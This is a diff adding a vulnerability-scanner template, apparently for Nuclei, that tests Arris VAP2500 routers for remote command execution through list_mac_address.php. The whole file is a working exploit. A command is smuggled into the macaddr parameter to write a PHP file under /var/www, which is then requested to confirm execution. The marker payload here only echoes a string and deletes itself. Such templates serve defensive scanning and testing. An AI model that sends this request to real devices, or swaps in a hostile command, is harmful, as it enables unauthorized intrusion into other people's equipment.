@@ -1,0 +1,32 @@
+id: Arris-VAP2500-list_mac_address-RCE
+
+info:
+  name: Arris vap2500 list_mac_address 远程命令执行
+  author: HuanXiong
+  severity: high
+
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+      - |
+        POST /list_mac_address.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+        
+        macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+%40error_reporting%280%29%3Becho+%22pboyjnnrfipmplsukdeczudsefxmywe%22%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+%2Fvar%2Fwww%2F{{filename}}.php&action=0&settype=1
+
+      - |
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 
+        
+    matchers:     
+      - type: dsl
+        name: 远程命令执行
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')" 
